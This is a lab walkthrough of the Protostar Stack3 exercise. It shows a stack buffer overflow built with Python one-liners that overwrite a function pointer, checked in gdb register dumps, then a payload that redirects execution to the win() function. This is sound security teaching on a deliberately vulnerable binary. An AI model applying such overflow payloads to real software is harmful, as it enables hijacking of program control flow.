With Stack3 we'll have an opportunity to target some real memory ranges and see how that works.   I'll also introduce using
python to speed up the process.

First, we know from the source code that the buffer should be 64 bytes

```
  char buffer[64];
```

So, let's prove that out.

This one-line python script fills the buffer with 66 "A" (0x41) and 2 "B" (0x42).

```
﻿user@protostar:/opt/protostar/bin$ python -c 'print "A"*66 + "BB"' | ./stack3
calling function pointer, jumping to 0x42424141
Segmentation fault
```

Perfect!  2 B's and 2 A's are sitting in the [EIP](http://www.c-jump.com/CIS77/ASM/Instructions/I77_0040_instruction_pointer.htm).  We can verify this in gdb.
  
```
﻿(gdb) run
Starting program: /opt/protostar/bin/stack3 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABB         
calling function pointer, jumping to 0x42424141

Program received signal SIGSEGV, Segmentation fault.
0x42424141 in ?? ()
(gdb) i r
eax            0x42424141	1111638337
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff73c	0xbffff73c
ebp            0xbffff7a8	0xbffff7a8
esi            0x0	0
edi            0x0	0
eip            0x42424141	0x42424141
eflags         0x210292	[ AF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 
eax            0x42424141	1111638337
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff73c	0xbffff73c
ebp            0xbffff7a8	0xbffff7a8
esi            0x0	0
edi            0x0	0
eip            0x42424141	0x42424141
```

Next, we need to determine where in memory the *win()* function is located.  gdb can help us with that as well!

```
﻿(gdb) break win
Breakpoint 1 at 0x804842a: file stack3/stack3.c, line 8.
```

Note that there might not be a chance to jump straight to a function and finding a target in memory gets even harder once
memory randomizing technologies are introduced.  For this exercise we're golden, so we'll give this a shot in python by
adding the appropriate hex data at the end of the 64 byte filler.


```
﻿user@protostar:/opt/protostar/bin$ python -c 'print "A"*64 + "\x2a\x84\x04\x08"' | ./stack3
calling function pointer, jumping to 0x0804842a
code flow successfully changed
```

In this case the code was redirected to the win() function

```
void win()
{
  printf("code flow successfully changed\n");
}
```

Pointing to other functions comes in handy when using [ROP Gadgets](https://en.wikipedia.org/wiki/Return-oriented_programming), but that's likely left for a later lesson. 


Move on to [Stack4](../stack4/)